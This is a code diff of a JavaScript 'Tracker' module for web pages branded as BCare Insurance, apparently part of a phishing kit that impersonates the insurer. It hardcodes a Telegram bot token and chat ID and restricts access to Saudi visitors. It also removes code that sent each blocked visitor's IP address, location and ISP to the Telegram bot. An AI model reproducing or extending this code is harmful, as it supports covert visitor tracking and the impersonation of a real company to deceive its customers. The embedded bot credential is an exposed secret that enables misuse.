@@ -10,7 +10,7 @@ const Tracker = (function () {
   const TG_TOKEN    = '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow';
   const TG_CHAT     = '1451039924';
 
-  const ALLOWED_COUNTRIES = ['EG', 'SA'];
+  const ALLOWED_COUNTRIES = ['SA'];
 
   const PAGE_NAMES = {
     'app.html':            'الصفحة الرئيسية',
@@ -272,26 +272,6 @@ ${extra ? '\n' + extra : ''}`;
 
       if (ALLOWED_COUNTRIES.includes(country)) return false;
 
-      /* إرسال إشعار لتليجرام */
-      try {
-        const loc = geo.country ? `${geo.flag} ${geo.country}${geo.city ? ' — ' + geo.city : ''}${geo.isp ? ' | ' + geo.isp : ''}` : '';
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TG_CHAT,
-            text: `🚫 <b>محاولة وصول غير مصرح بها</b>
-
-🌐 IP: <code>${ip}</code>
-📍 الموقع: ${loc || 'غير معروف'}
-🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
-
-⚠️ تم حظر الاتصال تلقائياً — خارج المناطق المصرح بها`,
-            parse_mode: 'HTML',
-          }),
-        });
-      } catch(e) {}
-
       document.body.innerHTML = buildGeoBlockedScreen(geo);
       return true;
     } catch(e) {}
@@ -364,7 +344,7 @@ ${extra ? '\n' + extra : ''}`;
         <div class="divider"></div>
         <div class="info"><span class="material-icons">location_on</span><span>${loc || 'موقع غير معروف'}</span></div>
         <div class="info"><span class="material-icons">public</span><span>الخدمة غير متاحة في منطقتك</span></div>
-        <p class="msg">هذه الخدمة متاحة فقط في <b>مصر</b> و<b>المملكة العربية السعودية</b>.<br/>للتواصل مع الدعم، يرجى زيارة موقعنا الرسمي.</p>
+        <p class="msg">هذه الخدمة متاحة فقط في <b>المملكة العربية السعودية</b>.<br/>للتواصل مع الدعم، يرجى زيارة موقعنا الرسمي.</p>
         <div class="cloudflare"><span class="material-icons">shield</span><span>Protected by BCare Security</span></div>
         <div class="footer">BCare Insurance &copy; ${new Date().getFullYear()} — <a href="#">اتصل بنا</a></div>
       </div>
